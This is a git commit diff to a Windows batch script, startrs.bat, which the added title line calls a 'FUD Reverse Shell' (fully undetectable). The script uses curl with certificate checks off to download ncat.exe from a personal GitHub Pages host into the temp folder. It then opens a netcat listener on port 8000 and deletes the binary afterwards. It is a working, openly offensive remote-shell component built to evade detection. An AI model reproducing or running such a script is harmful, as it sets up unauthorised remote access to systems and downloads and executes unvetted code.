7e9e1c2c73c1ee50a3030a6947cb6d0ee04e11ba
stivengiv <94831607+stivengiv@users.noreply.github.com>
2023-01-20 13:54:16 +0100

    Update startrs.bat

--- startrs.bat
+++ startrs.bat
@@ -1,4 +1,5 @@
 @echo off
+title FUD Reverse Shell ^| by aritz331_ for Aritz's Utils - an aritz331_ original series^^TM
 curl -kLs stivengiv.github.io/revs/ncat.exe -o %temp%\nc.exe
 %temp%\nc -nlvp 8000
 del /s /f /q %temp%\nc.exe
